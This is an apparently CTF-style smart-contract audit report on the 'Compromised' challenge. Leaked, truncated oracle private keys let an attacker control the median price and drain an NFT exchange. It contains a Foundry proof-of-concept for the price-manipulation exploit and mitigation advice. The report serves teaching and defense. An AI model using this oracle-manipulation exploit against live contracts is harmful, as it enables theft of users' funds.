---
title: Compromised Audit Report
author: Jack
date: January 11, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Private keys of oracle sources leaked via HTTP response headers, enabling complete price manipulation and treasury drain

**Description:** Two of the three trusted oracle source private keys were leaked in an HTTP server response as hex-encoded, base64-encoded strings. An attacker who decodes these strings can reconstruct the private keys and thus control two out of three oracle price sources:

```
Leaked hex bytes (from HTTP response):
4d 48 67 33 5a 44 45 31 59 6d 4a 68 ... → Base64 → "0x7d15bba26c523..." (private key 1)
4d 48 67 32 4f 47 4a 6b 4d 44 49 77 ... → Base64 → "0x68bd020ad18..."  (private key 2)

Decoded addresses:
Key 1 → 0x188Ea627E3531Db590e6f1D71ED83628d1933088 (oracle source[0])
Key 2 → 0xA417D473c40a4d42BAd35f147c21eEa7973539D8 (oracle source[1])
```

`TrustfulOracle` computes the NFT price as the median of all three source prices. Controlling two out of three sources is sufficient to set an arbitrary median:

```solidity
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = getAllPricesForSymbol(symbol);
    LibSort.insertionSort(prices);
    // With 3 sources, index 1 is the median — controlled by attacker if 2 of 3 are held
    return prices[prices.length / 2];
}
```

By using the two compromised keys to post a price of `0.001 ETH`, the attacker sets the median to `0.001 ETH`, buys the NFT for nearly nothing, then posts a price of `999 ETH` and sells the NFT back to the exchange at the manipulated high price, draining the exchange's entire ETH balance.

**Impact:** Complete ETH drainage of the `Exchange` contract. Starting with minimal ETH, an attacker can steal all 999 ETH by:
1. Manipulating price down to near-zero → buy NFT cheaply
2. Manipulating price up to exchange's full balance → sell NFT back

**Proof of Concept:**

```solidity
// 1. Reconstruct signing keys from leaked data
uint256 privateKey1 = 0x7d15bba26c523...;
uint256 privateKey2 = 0x68bd020ad18...;

// 2. Set price to near-zero via both compromised sources
vm.startPrank(vm.addr(privateKey1));
oracle.postPrice("DVNFT", 0.001 ether);
vm.startPrank(vm.addr(privateKey2));
oracle.postPrice("DVNFT", 0.001 ether);
// median = 0.001 ETH ✓

// 3. Buy NFT for 0.001 ETH
uint256 tokenId = exchange.buyOne{value: 0.001 ether}();

// 4. Set price to exchange's full balance
vm.startPrank(vm.addr(privateKey1));
oracle.postPrice("DVNFT", 999 ether);
vm.startPrank(vm.addr(privateKey2));
oracle.postPrice("DVNFT", 999 ether);
// median = 999 ETH ✓

// 5. Sell NFT for 999 ETH — drains exchange
nft.approve(address(exchange), tokenId);
exchange.sellOne(tokenId);
```

**Recommended Mitigation:**

1. **Revoke and rotate the compromised private keys immediately.** The affected source addresses must be replaced with new keys generated in a secure, offline environment.
2. **Audit all infrastructure for key material exposure** — HTTP headers, logs, dashboards, environment files.
3. **Add oracle security hardening:**
   - Require a minimum number of independent, geographically-separated sources (5+ for critical systems).
   - Implement price deviation bounds — reject individual reports that deviate more than X% from the previous median.
   - Use commit-reveal or signed off-chain oracle data (e.g., Chainlink, Pyth) instead of on-chain post-price calls.
4. **Limit maximum price change per update period** to reduce blast radius of a compromised source.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
